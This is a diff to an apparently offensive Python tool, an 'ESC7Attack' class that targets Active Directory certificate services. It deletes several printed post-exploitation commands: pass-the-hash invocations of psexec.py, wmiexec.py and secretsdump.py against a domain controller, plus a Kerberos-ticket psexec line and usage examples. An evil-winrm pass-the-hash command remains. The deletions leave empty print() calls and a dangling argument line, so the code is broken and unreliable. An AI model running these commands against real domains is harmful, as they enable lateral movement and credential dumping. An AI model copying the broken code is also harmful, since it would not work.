@@ -2495,13 +2495,10 @@ class ESC7Attack:
             _section("Pass-the-Hash commands")
             print(f"  evil-winrm  -i {self.args.dc_ip} -u {u} -H {h}")
             print(
-                f"  psexec.py   {d}/{u}@{self.args.dc_ip} -hashes :{h}"
             )
             print(
-                f"  wmiexec.py  {d}/{u}@{self.args.dc_ip} -hashes :{h}"
             )
             print(
-                f"  secretsdump.py {d}/{u}@{self.args.dc_ip} -hashes :{h}"
             )
 
         if auth.ccache_name and os.path.isfile(auth.ccache_name):
@@ -2511,7 +2508,6 @@ class ESC7Attack:
                 f"  export KRB5CCNAME={auth.ccache_name}"
             )
             print(
-                f"  psexec.py -k -no-pass {d}/{u}@{self.args.dc_ip}"
             )
 
     # ── Cleanup ───────────────────────────────────────────────────────────────
@@ -2777,10 +2773,7 @@ def parse_args() -> argparse.Namespace:
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  python3 esc7_unified.py
-  python3 esc7_unified.py -u ca-admin@domain.com -p Password1 \\
       --dc-ip 192.168.10.30 --upn Administrator@domain.com
-  python3 esc7_unified.py ... --start-from 5 --request-id 37
         """,
     )
 
